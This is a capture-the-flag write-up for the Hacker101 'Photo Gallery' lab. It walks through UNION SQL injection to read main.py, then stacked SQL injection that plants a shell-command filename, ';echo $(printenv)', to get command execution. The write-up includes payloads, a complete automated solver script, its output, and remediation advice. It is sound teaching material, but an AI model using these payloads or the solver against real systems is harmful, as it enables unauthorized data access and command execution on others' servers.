---
description: >-
  Step-by-step Hacker101 Photo Gallery writeup covering /fetch endpoint recon,
  UNION SQL injection, source code disclosure through main.py, stacked SQL
  injection, stored command injection through poison
---

# Photo Gallery Blog - Hacker101 CTF Writeup

## Overview

This machine is called **Photo Gallery**.

My instance URL was:

```
https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/
```

At first, the website looks very simple. It shows a small photo gallery with a few images and a disk usage message at the bottom:

```
Space used: 0 total
```

There is no login page, no search field, and nothing obvious to exploit.

But after checking how the images are loaded, I found that the app uses a `/fetch` endpoint:

```
/fetch?id=1
/fetch?id=2
/fetch?id=3
```

That `id` parameter is the main attack surface.

The final attack chain was:

```
SQL Injection -> Source Code Disclosure -> Stored Command Injection -> Environment Variable Dump
```

The machine has three flags, and all of them were recovered.

***

## Initial Recon

I started by opening the homepage:

```bash
curl -i https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/
```

The page returned normal HTML for a small gallery.

After checking the page source and the image requests, I noticed that the images were not loaded directly by filename. Instead, they were loaded through `/fetch` with an `id` parameter.

Example:

```bash
curl -i "https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/fetch?id=1"
```

I tried a few different IDs:

```bash
curl -i "https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/fetch?id=2"
curl -i "https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/fetch?id=3"
curl -i "https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/fetch?id=4"
```

This made it clear that the backend was probably using the `id` value to look up an image in a database.

The backend logic was probably something like:

```sql
SELECT filename FROM photos WHERE id = <user input>;
```

If the user input is inserted directly into the SQL query, then `/fetch?id=` may be vulnerable to SQL injection.

***

## Testing for SQL Injection

I tested a simple UNION-style injection.

The payload was:

```sql
4 UNION SELECT 'test'
```

The idea was to make the database return the string `test` as a filename.

The request would look like this:

```bash
curl "https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/fetch?id=4%20UNION%20SELECT%20'test'"
```

The response behavior showed that the input was being interpreted as SQL.

So the `id` parameter was injectable.

Now the important question was: what should I make it return?

***

## FLAG0 — Reading `main.py`

Since `/fetch` seemed to return files based on filenames from the database, I tried to make the SQL query return a filename that I wanted.

The payload I used was:

```sql
4 UNION SELECT 'main.py'
```

Full request:

```bash
curl "https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/fetch?id=4%20UNION%20SELECT%20'main.py'"
```

This returned the contents of the application source code.

Inside that response, I found the first flag:

```
^FLAG^57f1e79d7469fd973d5c073996941eaffd685681f4b4be93289aea936396ce9d$FLAG$
```

***

## Why I Tried `main.py`

This part is important.

`main.py` did not magically appear from the database.

I injected it.

At this point, I knew two things:

```
1. The `/fetch?id=` parameter was SQL injectable.
2. The app was probably reading a filename returned from the database.
```

The normal backend flow probably looked like this:

```
User requests:
/fetch?id=1
```

Then the app does something similar to:

```sql
SELECT filename FROM photos WHERE id = 1;
```

If the database returns:

```
kitten.jpg
```

then the app reads:

```
files/kitten.jpg
```

or some other local path.

So if I can control the SQL result, I can control what filename the application tries to read.

That is what this payload does:

```sql
4 UNION SELECT 'main.py'
```

The important part is:

```sql
SELECT 'main.py'
```

This forces the query result to contain the string:

```
main.py
```

So instead of returning a real photo filename from the database, the query returns a fake filename chosen by me.

The vulnerable app then treats that result as a file to read.

So the logic becomes:

```
Database result: main.py
Application action: read file named main.py
```

I guessed `main.py` because this is a Python web application, and Python Flask apps commonly use filenames like:

```
main.py
app.py
application.py
server.py
```

For this machine, `main.py` was the correct file.

So this SQL injection:

```sql
4 UNION SELECT 'main.py'
```

turned into source code disclosure.

***

## What the Source Code Revealed

Reading `main.py` was useful because it showed how the application worked.

The important discovery was that photo filenames were stored in the database.

The homepage also calculated the space used by those photo files.

The dangerous part was that the app used filenames inside a shell command.

The vulnerable logic was basically:

```python
subprocess.check_output(
    'du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns),
    shell=True,
    stderr=subprocess.STDOUT
)
```

The problem is the combination of these things:

```
1. Filenames come from the database.
2. The database can be modified through SQL injection.
3. Those filenames are inserted into a shell command.
4. The shell command runs with shell=True.
```

That means if I can change a filename in the database to shell syntax, I can get command execution.

For example, if a filename becomes:

```bash
;echo $(printenv)
```

then the shell command becomes something like:

```bash
du -ch files/;echo $(printenv) || exit 0
```

The semicolon ends the first command.

Then the shell executes:

```bash
echo $(printenv)
```

That is command injection.

***

## FLAG1 — Database Enumeration Attempt

Since the `/fetch?id=` parameter was injectable, I also tried dumping data manually from likely database tables.

The table name looked like it was probably:

```
photos
```

So I tested payloads like:

```sql
1 UNION SELECT filename FROM photos
```

Full request:

```bash
curl "https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/fetch?id=1%20UNION%20SELECT%20filename%20FROM%20photos"
```

I also tried a few other guesses:

```sql
1 UNION SELECT name FROM photos
1 UNION SELECT flag FROM photos
1 UNION SELECT concat(id,':',filename) FROM photos
1 UNION SELECT table_name FROM information_schema.tables
1 UNION SELECT column_name FROM information_schema.columns
```

In my automated run, these manual UNION probes did not directly return a separate FLAG1.

The output looked like this:

```
[+] FLAG1 backup: trying manual UNION probes
[+] Trying: 1 UNION SELECT filename FROM photos
[+] Trying: 1 UNION SELECT name FROM photos
[+] Trying: 1 UNION SELECT flag FROM photos
[+] Trying: 1 UNION SELECT concat(id,':',filename) FROM photos
[+] Trying: 1 UNION SELECT table_name FROM information_schema.tables
[+] Trying: 1 UNION SELECT column_name FROM information_schema.columns

[FLAG1]
[-] No flags found
```

But this was not a problem.

The command injection path later dumped the environment variables and revealed all three flags, including the second flag.

So I did not need to rely on slow database dumping.

***

## FLAG2 — Stored Command Injection

This was the main part of the exploit.

From the source code, the homepage runs a disk usage command using filenames from the database.

That means I can poison a filename in the database and then trigger the command by loading the homepage.

The SQL injection supports stacked queries, so I can end the original query and run an `UPDATE`.

The payload was:

```sql
3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;
```

Full URL-encoded request:

```bash
curl "https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/fetch?id=3%3B%20UPDATE%20photos%20SET%20filename%3D%22%3Becho%20%24%28printenv%29%22%20WHERE%20id%3D3%3B%20commit%3B"
```

Breaking it down:

```sql
3;
```

This ends the original query.

```sql
UPDATE photos SET filename=";echo $(printenv)" WHERE id=3;
```

This changes the filename for photo ID 3.

```sql
commit;
```

This saves the database change.

Now the database contains a malicious filename:

```bash
;echo $(printenv)
```

After that, I loaded the homepage:

```bash
curl "https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/"
```

The homepage tried to calculate disk usage.

Because the filename was inserted into a shell command, the app executed my command.

The command became something like:

```bash
du -ch files/;echo $(printenv) || exit 0
```

The shell sees the semicolon and treats it as a command separator.

So it runs:

```bash
du -ch files/
echo $(printenv)
```

The second command dumps environment variables.

That gave me all flags.

***

## Why `printenv` Dumped All Flags

`printenv` prints environment variables.

In many containerized CTF challenges, flags are stored as environment variables.

So when the command injection executed:

```bash
printenv
```

the response contained environment variables, including the flags.

That is why the final stage found all three flags very quickly.

The command injection was more powerful than just reading one table row. It exposed the whole container environment.

***

## Full Solver Script

This is the script I used to solve the machine.

It performs the whole chain automatically:

```
1. Use UNION injection to read main.py.
2. Extract any flags from the source code.
3. Try some manual UNION database probes.
4. Use stacked SQL injection to update a photo filename.
5. Set the filename to ;echo $(printenv).
6. Load the homepage to trigger command injection.
7. Extract all flags from the output.
```

```python
#!/usr/bin/env python3
import argparse
import re
import subprocess
import sys
from urllib.parse import quote

import requests


DEFAULT_URL = "https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com"


def normalize_url(url):
    url = url.strip().rstrip("/")

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    return url


def extract_flags(text):
    flags = re.findall(r"\^FLAG\^[A-Za-z0-9]+\$FLAG\$", text)
    return list(dict.fromkeys(flags))


def print_flags(name, flags):
    print(f"\n[{name}]")

    if not flags:
        print("[-] No flags found")
        return

    for flag in flags:
        print(f"[+] {flag}")


def flag0_read_main_py(base_url):
    print("[+] FLAG0: trying UNION file read for main.py")

    payload = "4 UNION SELECT 'main.py'"
    url = f"{base_url}/fetch?id={quote(payload)}"

    r = requests.get(url, timeout=20)
    print(f"[+] Response status: {r.status_code}")

    flags = extract_flags(r.text)

    if flags:
        print("[+] FLAG0 found from main.py")
    else:
        print("[-] FLAG0 not found directly")

    return flags, r.text


def flag1_manual_enum(base_url):
    print("\n[+] FLAG1 backup: trying manual UNION probes")

    payloads = [
        "1 UNION SELECT filename FROM photos",
        "1 UNION SELECT name FROM photos",
        "1 UNION SELECT flag FROM photos",
        "1 UNION SELECT concat(id,':',filename) FROM photos",
        "1 UNION SELECT table_name FROM information_schema.tables",
        "1 UNION SELECT column_name FROM information_schema.columns",
    ]

    all_text = ""
    all_flags = []

    for payload in payloads:
        url = f"{base_url}/fetch?id={quote(payload)}"
        print(f"[+] Trying: {payload}")

        try:
            r = requests.get(url, timeout=20)
            all_text += "\n" + r.text
            all_flags.extend(extract_flags(r.text))
        except requests.RequestException as e:
            print(f"[-] Request failed: {e}")

    return list(dict.fromkeys(all_flags)), all_text


def flag1_sqlmap_dump(base_url):
    print("\n[+] FLAG1: trying sqlmap dump of level5.photos")

    target = f"{base_url}/fetch?id=1"

    cmd = [
        "sqlmap",
        "-u",
        target,
        "--batch",
        "--dump",
        "-D",
        "level5",
        "-T",
        "photos",
        "--threads",
        "5",
    ]

    print("[+] Running:")
    print(" ".join(cmd))

    try:
        p = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=300,
        )
    except FileNotFoundError:
        print("[-] sqlmap is not installed")
        return [], ""
    except subprocess.TimeoutExpired as e:
        print("[-] sqlmap timed out")
        output = e.stdout or ""
        return extract_flags(output), output

    output = p.stdout
    flags = extract_flags(output)

    if flags:
        print("[+] FLAG1 found from sqlmap output")
    else:
        print("[-] No FLAG found in sqlmap output")

    return flags, output


def trigger_homepage(base_url):
    r = requests.get(base_url + "/", timeout=20)
    return r.text


def flag2_command_injection(base_url, command):
    print("\n[+] FLAG2: using stacked SQL injection to poison filename")
    print(f"[+] Command: {command}")

    injected_filename = f";echo $({command})"

    payload = (
        '3; UPDATE photos SET filename="'
        + injected_filename.replace('"', '\\"')
        + '" WHERE id=3; commit;'
    )

    url = f"{base_url}/fetch?id={quote(payload, safe='')}"

    print("[+] Sending stacked-query payload")

    r = requests.get(url, timeout=20)
    print(f"[+] Payload response status: {r.status_code}")

    print("[+] Loading homepage to trigger shell command")

    text = trigger_homepage(base_url)

    flags = extract_flags(text)

    if flags:
        print("[+] FLAG2 found from command output")
    else:
        print("[-] No flag found from command output")
        print("[+] Homepage output preview:")
        print(text[:2000])

    return flags, text


def restore_filename(base_url):
    print("\n[+] Cleanup: trying to restore id=3 filename to missing.jpg")

    payload = '3; UPDATE photos SET filename="missing.jpg" WHERE id=3; commit;'
    url = f"{base_url}/fetch?id={quote(payload, safe='')}"

    try:
        requests.get(url, timeout=20)
    except requests.RequestException:
        pass


def main():
    parser = argparse.ArgumentParser(description="Hacker101 Photo Gallery solver")

    parser.add_argument(
        "--url",
        default=DEFAULT_URL,
        help="Challenge instance URL",
    )

    parser.add_argument(
        "--no-sqlmap",
        action="store_true",
        help="Skip sqlmap and use only manual probes",
    )

    parser.add_argument(
        "--cleanup",
        action="store_true",
        help="Try to restore the poisoned filename after FLAG2",
    )

    args = parser.parse_args()

    base_url = normalize_url(args.url)

    print(f"[+] Target: {base_url}")

    all_flags = []

    try:
        flags0, main_py = flag0_read_main_py(base_url)
        print_flags("FLAG0", flags0)
        all_flags.extend(flags0)

        if not args.no_sqlmap:
            flags1, sqlmap_output = flag1_sqlmap_dump(base_url)
        else:
            flags1, sqlmap_output = [], ""

        if not flags1:
            backup_flags1, backup_text = flag1_manual_enum(base_url)
            flags1.extend(backup_flags1)

        print_flags("FLAG1", flags1)
        all_flags.extend(flags1)

        flags2, env_output = flag2_command_injection(base_url, "printenv")
        print_flags("FLAG2", flags2)
        all_flags.extend(flags2)

        if args.cleanup:
            restore_filename(base_url)

    except KeyboardInterrupt:
        print("\n[-] Interrupted")
        sys.exit(1)

    except requests.RequestException as e:
        print(f"[-] HTTP error: {e}")
        sys.exit(1)

    all_flags = list(dict.fromkeys(all_flags))

    print("\n==============================")
    print("[+] ALL FLAGS FOUND")
    print("==============================")

    if all_flags:
        for flag in all_flags:
            print(flag)
    else:
        print("[-] No flags found")


if __name__ == "__main__":
    main()
```

***

## Running the Script

I saved the script as:

```
solve.py
```

Then I ran it with:

```bash
python3 solve.py --url https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com/ --no-sqlmap
```

I used `--no-sqlmap` because the command injection path was enough to get all flags.

The output was:

```
[+] Target: https://513eb910f05e891313e68d9c81b4f3a6.ctf.hacker101.com
[+] FLAG0: trying UNION file read for main.py
[+] Response status: 200
[+] FLAG0 found from main.py

[FLAG0]
[+] ^FLAG^57f1e79d7469fd973d5c073996941eaffd685681f4b4be93289aea936396ce9d$FLAG$

[+] FLAG1 backup: trying manual UNION probes
[+] Trying: 1 UNION SELECT filename FROM photos
[+] Trying: 1 UNION SELECT name FROM photos
[+] Trying: 1 UNION SELECT flag FROM photos
[+] Trying: 1 UNION SELECT concat(id,':',filename) FROM photos
[+] Trying: 1 UNION SELECT table_name FROM information_schema.tables
[+] Trying: 1 UNION SELECT column_name FROM information_schema.columns

[FLAG1]
[-] No flags found

[+] FLAG2: using stacked SQL injection to poison filename
[+] Command: printenv
[+] Sending stacked-query payload
[+] Payload response status: 500
[+] Loading homepage to trigger shell command
[+] FLAG2 found from command output

[FLAG2]
[+] ^FLAG^57f1e79d7469fd973d5c073996941eaffd685681f4b4be93289aea936396ce9d$FLAG$
[+] ^FLAG^eeeae529bb2ca9230262b479d3628d13d60765178ca55c7fbb7caf170fbc1a15$FLAG$
[+] ^FLAG^b8093632a2e3bf89d7972756440b9f02ad2872285f6c92985fc4b834b0374c77$FLAG$

==============================
[+] ALL FLAGS FOUND
==============================
^FLAG^57f1e79d7469fd973d5c073996941eaffd685681f4b4be93289aea936396ce9d$FLAG$
^FLAG^eeeae529bb2ca9230262b479d3628d13d60765178ca55c7fbb7caf170fbc1a15$FLAG$
^FLAG^b8093632a2e3bf89d7972756440b9f02ad2872285f6c92985fc4b834b0374c77$FLAG$
```

The stacked SQL injection request returned HTTP 500, but that did not matter.

The database update still happened.

After that, loading the homepage triggered the poisoned filename and executed `printenv`.

***

## Final Flags

```
^FLAG^57f1e79d7469fd973d5c073996941eaffd685681f4b4be93289aea936396ce9d$FLAG$
^FLAG^eeeae529bb2ca9230262b479d3628d13d60765178ca55c7fbb7caf170fbc1a15$FLAG$
^FLAG^b8093632a2e3bf89d7972756440b9f02ad2872285f6c92985fc4b834b0374c77$FLAG$
```

***

## Why This Worked

The machine was vulnerable because of two bad patterns chained together.

First, the `/fetch?id=` endpoint was SQL injectable:

```
/fetch?id=4 UNION SELECT 'main.py'
```

That allowed me to control the filename returned by the database.

Second, the app later used database-controlled filenames in a shell command:

```python
subprocess.check_output(..., shell=True)
```

That allowed me to turn a database value into shell command execution.

The final payload was:

```sql
3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;
```

This changed the filename to:

```bash
;echo $(printenv)
```

Then the homepage command became:

```bash
du -ch files/;echo $(printenv) || exit 0
```

The semicolon started a new command, and `printenv` dumped the flags from the environment.

***

## Fix

The SQL injection should be fixed by using parameterized queries.

Bad:

```python
query = "SELECT filename FROM photos WHERE id = %s" % request.args["id"]
```

Good:

```python
cursor.execute(
    "SELECT filename FROM photos WHERE id = %s",
    (request.args["id"],)
)
```

The command injection should be fixed by not using `shell=True`.

Bad:

```python
subprocess.check_output(
    'du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns),
    shell=True
)
```

Better:

```python
subprocess.run(
    ["du", "-ch"] + ["files/" + fn for fn in fns],
    capture_output=True,
    text=True
)
```

Also, filenames from the database should be validated so they cannot contain shell metacharacters like:

```
;
$
`
|
&
>
<
```

***

## Summary

The full path was:

```
1. Found /fetch?id= image endpoint.
2. Tested SQL injection.
3. Used UNION SELECT 'main.py' to read source code.
4. Found that filenames are stored in the database.
5. Found that filenames are used inside a shell command.
6. Used stacked SQL injection to update a filename.
7. Set the filename to ;echo $(printenv).
8. Loaded the homepage to trigger command execution.
9. Extracted all three flags from environment variables.
```

The key payloads were:

```sql
4 UNION SELECT 'main.py'
```

and:

```sql
3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;
```

This was a nice SQL injection to command injection chain.
